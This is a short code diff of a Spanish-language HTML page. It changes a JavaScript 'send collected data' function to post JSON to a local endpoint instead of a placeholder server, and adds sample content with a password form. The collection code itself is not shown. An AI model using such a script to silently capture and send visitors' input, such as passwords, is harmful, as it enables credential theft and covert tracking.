@@ -20,7 +20,7 @@
             // Función para enviar datos recolectados
             function sendData(data) {
                 var xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://tu-servidor.com/recibir-datos', true);
+                xhr.open('POST', '/recibir-datos', true);
                 xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
                 xhr.send(JSON.stringify(data));
             }
@@ -36,6 +36,14 @@
     </script>
 </head>
 <body>
-    <!-- Contenido de tu página -->
+    <h1>Bienvenido a mi página</h1>
+    <p>Esta es una página de ejemplo. Puedes agregar cualquier contenido aquí.</p>
+    <img src="https://via.placeholder.com/150" alt="Imagen de ejemplo">
+    <a href="https://www.ejemplo.com">Visita este enlace</a>
+    <form>
+        <label for="password">Contraseña:</label>
+        <input type="password" id="password" name="password">
+        <input type="submit" value="Enviar">
+    </form>
 </body>
 </html>
